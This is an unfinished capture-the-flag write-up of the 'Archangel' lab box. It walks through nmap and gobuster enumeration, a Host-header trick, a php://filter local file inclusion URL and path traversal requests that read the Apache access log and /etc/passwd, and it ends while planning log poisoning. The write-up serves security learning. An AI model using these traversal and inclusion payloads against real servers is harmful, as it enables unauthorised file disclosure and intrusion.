# Archangel
Boot2root, Web exploitation, Priv Esc, LFI Rated: Easy

This Box was challenging for being so unstable. It needs a few minutes to recover after nearly every run
of _gobuster_. That's when it can still be accessed after a _gobuster_ run. Rebooted numerous times.

To start I will put the target box's ip address into an environment variable, and carefully and cautiously
try to remember to put this environment variable into each new tmux pane I open. Although some time into 
the enumeration I discovered that you really don't insert headers in _gobuster_ by using the `-H` flag. Just 
put the vHost domain you will find into your hosts file and it really really really simplifies your tasks.
`echo TARGET=[issued ip address]`
`echo $TARGET "\t" <domain.discovered> | sudo -tee -a /etc/hosts`

## Enumeration
Curious fact, I found I needed to install the dev version of **NMAP** from source while completing a Challenge Room
just previous to this one. Apparently the version (nmap-7.92) in the Kali Linux repos throws a seg fault
if the **NSE** scripting engine is invoked.<br>
At least the standard kali install, of a recent release, does include all the necessary libraries to compile
nmap from source and a simple
> ```sh
> cd nmap-7.93
> ./configure
> su root
> make install
> ```
did suffice to drop a working nmap into `/usr/local/bin<br>
Now, on to our port scan:

```nmap
Nmap 7.93 scan initiated Thu Sep 29 11:29:42 2022 as: /usr/local/bin/nmap -Pn -sC -sV -vv -A -oN scans/archangel_init -T4 10.10.76.70
Increasing send delay for 10.10.76.70 from 0 to 5 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.76.70 from 5 to 10 due to 31 out of 76 dropped probes since last increase.
Nmap scan report for 10.10.76.70
Host is up, received user-set (0.23s latency).
Scanned at 2022-09-29 11:29:42 EDT for 126s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Wavefire
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/29%OT=22%CT=1%CU=35797%PV=Y%DS=4%DC=T%G=Y%TM=6335BA6
OS:4%P=x86_64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M5
OS:09ST11NW7%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B
OS:3)ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Uptime guess: 42.447 days (since Thu Aug 18 00:48:18 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 711/tcp)
HOP RTT       ADDRESS
1   92.52 ms  10.13.0.1
2   ... 3
4   232.74 ms 10.10.76.70

Read data files from: /usr/local/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 29 11:31:48 2022 -- 1 IP address (1 host up) scanned in 126.42 seconds
```
Despite returning *pings* I found on the first *nmap* run that I needed the `-Pn` parameter to disable `nmap` from pinging the box.<br>
The rest of the switches `-sC` (run default _nse_ scripts) `-sV` (attempt version detection) and `-A` (Aggressive OS detection). `-oN` logs results in nmap text format.<br>
So we see two(2) ports open

| port | service | Version |
| ---- | ------- | ------- |
| 22 | sshd | OpenSSH 7.6p1 |
| 80 | httpd | Apache httpd 2.4.29 |
---
Time for some diry enumeration on the _httpd_ server. **GoBuster** to the rescue :smile:
> ```txt
> 
> ===============================================================
> Gobuster v3.1.0
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
> ===============================================================
> [+] Url:                     http://10.10.76.70
> [+] Method:                  GET
> [+] Threads:                 64
> [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
> [+] Negative Status codes:   404
> [+] User Agent:              gobuster/3.1.0
> [+] Extensions:              js,conf,txt,html,php
> [+] Timeout:                 10s
> ===============================================================
> 2022/09/29 12:17:45 Starting gobuster in directory enumeration mode
> ===============================================================
> /.htpasswd.php        (Status: 403) [Size: 276]
> /.htaccess            (Status: 403) [Size: 276]
> /.htpasswd.js         (Status: 403) [Size: 276]
> /.htaccess.html       (Status: 403) [Size: 276]
> /.htpasswd.conf       (Status: 403) [Size: 276]
> /.htaccess.php        (Status: 403) [Size: 276]
> /.htpasswd            (Status: 403) [Size: 276]
> /.htaccess.js         (Status: 403) [Size: 276]
> /.htpasswd.txt        (Status: 403) [Size: 276]
> /.htaccess.conf       (Status: 403) [Size: 276]
> /.htpasswd.html       (Status: 403) [Size: 276]
> /.htaccess.txt        (Status: 403) [Size: 276]
> /.hta.php             (Status: 403) [Size: 276]
> /.hta.js              (Status: 403) [Size: 276]
> /.hta.conf            (Status: 403) [Size: 276]
> /.hta                 (Status: 403) [Size: 276]
> /.hta.txt             (Status: 403) [Size: 276]
> /.hta.html            (Status: 403) [Size: 276]
> /flags                (Status: 301) [Size: 310] [--> http://10.10.76.70/flags/]
> /images               (Status: 301) [Size: 311] [--> http://10.10.76.70/images/]
> /index.html           (Status: 200) [Size: 19188]                               
> /index.html           (Status: 200) [Size: 19188]                               
> /layout               (Status: 301) [Size: 311] [--> http://10.10.76.70/layout/]
> /licence.txt          (Status: 200) [Size: 5014]                                
> /pages                (Status: 301) [Size: 310] [--> http://10.10.76.70/pages/] 
> /server-status        (Status: 403) [Size: 276]                                 
> ===============================================================
> 2022/09/29 12:21:29 Finished
> ===============================================================
> ```
`/flags` looks interesting<br>
*_If you like getting Rick Rolled, sheesh!_*

Ran _gobuster_ on the `/flags` diry, found a `flags.html` file which was little more than a redirect to...<br>
Wait for it...<br>
**Never Gonna ...** oh groan, by the notorious Rick Astley

Maybe `/pages` will yield something of greater value.

... maybe not.

I know, do the questions!
### Task 1
- Deploy the machine.
- You know, click the green _Start Machine_ button

### Task 2
1. Find a different hostname
	- Welp, `        ` the email domain on the index page **is** different than the templated domain on the `/pages/gallery.html` page
2. Find flag 1
	- Put the domain found in Q1 in a `Host: domain.ext` header then request the root index page to reveal the flag
	- `curl -s -H "Host: domain.thm" http://$TARGET | grep thm > flag_1.txt`
3. Look for a page under development
	- Hmmph! under development eh, guess we need to enumerate some more
	- _gobuster_ the rest of the dirs revealed in the root diry enumeration ==> `/images` and `/layout`
	- Nothing in `/layout`
	- Ah ha, yet another subdiry in `images`
	-  what a place to hide dev work
	- So _gobuster again, and again until we find all the endpoints.
	- Start enumeration from scratch
	- Discover the `-H` flag that works in `curl` does **not** work in `gobuster`
	- Put the _different_ domain into `hosts` file and enumerate the root again but with a vHost now
	- WhooHoo! found  `robots.txt           (Status: 200) [Size: 34]`
	- Grab `robots.txt` and we finally find the dev page  
		
		```
		User-agent: *
		Disallow: /xxxx.php  
		```
4. Find flag 2
	- This is a php site _under development_, turns out assuming typical defenses have not been put into play yet 
is correct. We will now use the `php` file we found to do a classic PHP style LFI using `php://filter` utility common 
in PHP deployments.
	- Using this url `http://sitename.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/html/development_testing/xxxx.php` to read the source 
of the `xxxx.php` file. The flag 2 is found in a comment.
5. Now we need to get a shell and find the user flag
	- This will involve "_Poison_" according to the hint.
	- Seems to me I remember finding the web server logs accessible in another room, and then poisoning them with something that 
gets logged...   Reloading that log would then enable a *_CMD Shell_*, not to be confused with a _web shell_ but very much like it. From 
there it is a matter of launching a native shell gets piped thru a network connection back to our attacking machine.
	- The irony here is that I never bothered to learn PHP when early on I learned that the language had so many flaws like the one 
I'm about to exploit. Now I'm no webdev but it seems to me that battening down the hatches takes more effort than site design. For 
that reason alone I would choose **any** other scripting language to provide services that are transported across public networks.
	- Alright, time to simmer down on the rants.
	- Let's see if we can reach the _Apache 2_&copy; logs
	- Of course we can!

```sh
curl -is http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
HTTP/1.1 200 OK
Date: Fri, 30 Sep 2022 01:01:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 985
Content-Type: text/html; charset=UTF-8
[...]
10.13.21.92 - - [30/Sep/2022:06:24:36 +0530] "GET /test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log HTTP/1.1" 200 459 "-" "curl/7.85.0"
10.13.21.92 - - [30/Sep/2022:06:25:51 +0530] "GET /test.php?view=/var/www/html/development_testing//..//..//..//..//etc/passwd HTTP/1.1" 200 1818 "-" "curl/7.85.0"
10.13.21.92 - - [30/Sep/2022:06:26:14 +0530] "GET /test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache/access.log HTTP/1.1" 200 458 "-" "curl/7.85.0"
10.13.21.92 - - [30/Sep/2022:06:27:38 +0530] "GET /test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/httpd/access.log HTTP/1.1" 200 458 "-" "curl/7.85.0"
```

 I see something that we can inject --> the *_User Agent_* string that accompanies most requests to any http server. In this instant case what you see above `curl/7.85`, the program I have been using up til now, and going forward.  
The fun and easy part now is that as long I make the request to a page the server _expects_ then it will show up in the access log. I suppose I could go for a non-existent page and then use the error.log...

#### To Be Continued
Apparently I need more practice poisoning apache logs for exploitative purposes.
Be back ... I'd say soon but I have no idea if or how long it will take me to pick up this skill.

